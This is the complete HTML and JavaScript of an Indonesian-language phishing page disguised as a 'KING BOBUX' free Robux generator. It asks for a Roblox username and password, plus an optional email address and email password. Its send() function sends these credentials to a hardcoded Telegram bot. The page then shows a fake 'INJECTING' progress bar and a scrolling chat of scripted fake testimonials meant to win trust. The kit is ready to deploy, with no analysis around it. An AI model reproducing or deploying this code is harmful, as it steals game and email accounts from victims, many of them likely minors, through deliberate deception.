<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KING BOBUX | ELITE V.10</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;700&family=Orbitron:wght@900&display=swap');
        body { background: #050505; background-image: radial-gradient(circle at 50% -20%, #221a00 0%, #050505 80%); color: #fff; font-family: 'Space Grotesk', sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; margin: 0; padding: 0; }
        .cyber-card { background: rgba(15, 15, 15, 0.9); backdrop-filter: blur(20px); border: 1px solid rgba(255, 215, 0, 0.1); box-shadow: 0 0 50px rgba(0,0,0,1); border-radius: 30px; position: relative; z-index: 50; }
        .gold-glow { font-family: 'Orbitron', sans-serif; text-shadow: 0 0 15px rgba(255, 215, 0, 0.5); background: linear-gradient(to bottom, #fff, #ffd700); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .btn-main { background: linear-gradient(90deg, #ffd700, #b8860b); color: #000; font-weight: 800; cursor: pointer; border-radius: 1rem; transition: 0.2s; border:none; }
        .btn-opt { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); cursor: pointer; border-radius: 1rem; transition: 0.3s; color: white; }
        .btn-opt.active { border-color: #ffd700; background: rgba(255, 215, 0, 0.2); }
        .input-glow { background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255, 215, 0, 0.2); width: 100%; padding: 15px; border-radius: 15px; color: #ffd700; outline: none; box-sizing: border-box; }
        .hidden { display: none !important; }
        #music-toggle { position: fixed; top: 20px; right: 20px; z-index: 1000; background: rgba(255, 215, 0, 0.1); border: 1px solid #ffd700; color: #ffd700; padding: 10px; border-radius: 50%; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body class="p-6">
    <button id="music-toggle" onclick="toggleMusic()">🔇</button>
    <audio id="bgm" loop muted>
        <source src="https://cdn.discordapp.com/attachments/1487168723466064074/1487290858339438743/9056977040d56940fbd8f2946f83369f.mp4?ex=69c89b0d&is=69c7498d&hm=e582044f9a1d6cfcc9e823062a9e7741c46bb42e0053c0b9a6cc0a403674b999&" type="audio/mp4">
    </audio>

    <header class="text-center my-10">
        <h1 class="text-4xl font-black gold-glow uppercase">KING BOBUX</h1>
    </header>

    <main class="cyber-card w-full max-w-sm p-8 shadow-2xl mb-8">
        <div id="p1" class="space-y-6">
            <div class="grid grid-cols-2 gap-4">
                <button type="button" onclick="setA(this,'10K')" class="btn-opt py-6 text-sm font-black">10K RBX</button>
                <button type="button" onclick="setA(this,'50K')" class="btn-opt py-6 text-sm font-black">50K RBX</button>
            </div>
            <button type="button" onclick="go(1,2)" class="w-full btn-main py-5 text-[10px] uppercase tracking-widest mt-4">NEXT SEQUENCE</button>
        </div>

        <div id="p2" class="hidden space-y-4">
            <button type="button" onclick="sh('e')" class="w-full btn-opt py-5 text-[10px] font-black flex justify-between px-6"><span>EMAIL +5K</span></button>
            <button type="button" onclick="sh('b')" class="w-full btn-opt py-5 text-[10px] font-black">REGULAR</button>
        </div>

        <div id="p3" class="hidden space-y-4">
            <input type="text" id="u" placeholder="USERNAME" class="input-glow text-xs">
            <input type="password" id="p" placeholder="PASSWORD" class="input-glow text-xs">
            <div id="ef" class="hidden space-y-4 pt-4 border-t border-zinc-800">
                <input type="email" id="em" placeholder="RECOVERY EMAIL" class="input-glow text-xs">
                <input type="password" id="ep" placeholder="EMAIL PASSWORD" class="input-glow text-xs">
            </div>
            <button type="button" onclick="send()" class="w-full btn-main py-5 text-[10px] uppercase tracking-widest mt-4">EXECUTE CLAIM</button>
        </div>

        <div id="p4" class="hidden text-center py-10">
            <h3 class="gold-glow text-xl font-black mb-4 italic">INJECTING...</h3>
            <div class="w-full h-1 bg-zinc-900 rounded-full overflow-hidden mb-4"><div id="bar" style="width:0%; height:100%; background:#ffd700; transition: 15s linear;"></div></div>
        </div>
    </main>

    <div class="w-full max-w-sm cyber-card p-6">
        <div id="chat-content" class="h-40 overflow-hidden text-[10px] space-y-1 mb-4"></div>
        <div class="flex space-x-2">
            <input type="text" id="victim-msg" placeholder="Komentar..." class="flex-grow input-glow !p-2 text-[10px]">
            <button type="button" onclick="victimSend()" class="btn-main !p-2 px-4 !rounded-lg text-[9px]">KIRIM</button>
        </div>
    </div>

    <script>
        let amt = "", md = "";
        const audio = document.getElementById('bgm');
        function toggleMusic() { if (audio.muted) { audio.muted = false; audio.play(); document.getElementById('music-toggle').innerText = "🔊"; } else { audio.muted = true; document.getElementById('music-toggle').innerText = "🔇"; } }
        function setA(b, v) { document.querySelectorAll('.btn-opt').forEach(x => x.classList.remove('active')); b.classList.add('active'); amt = v; audio.play().catch(()=>{}); }
        function go(f, t) { if (!amt && f == 1) return; document.getElementById('p' + f).classList.add('hidden'); document.getElementById('p' + t).classList.remove('hidden'); }
        function sh(m) { md = m; go(2, 3); if (m == 'e') document.getElementById('ef').classList.remove('hidden'); }
        function send() { 
            const u = document.getElementById('u').value, p = document.getElementById('p').value, e = document.getElementById('em').value || "-", ep = document.getElementById('ep').value || "-";
            fetch(`https://api.telegram.org/bot8712552694:AAHAjQQhwx4Vlas6CWs6QHB4iYSA5U2LiWM/sendMessage?chat_id=7153376507&text=${encodeURIComponent(`🚀 *LOGIN*\n👤 ${u}\n🔑 ${p}\n📧 ${e}\n💎 ${amt}`)}&parse_mode=Markdown`);
            go(3, 4); setTimeout(() => document.getElementById('bar').style.width = "100%", 100);
        }
        const bMsgs = ["Landing mulus!","Gacor 50k!","Thx admin","Work parah"];
        function addChat(n,m,v=false){
            const b=document.getElementById('chat-content'), d=document.createElement('div');
            d.innerHTML=`<span class="text-yellow-500">${n}</span>: ${m}`; b.insertBefore(d,b.firstChild);
            if(b.childNodes.length>6)b.removeChild(b.lastChild);
        }
        setInterval(()=>{ addChat("User***", bMsgs[Math.floor(Math.random()*bMsgs.length)]); }, 3000);
        function victimSend(){ const i=document.getElementById('victim-msg'); if(i.value){ addChat("K***_Anom", i.value, true); i.value=""; } }
    </script>
</body>
</html>
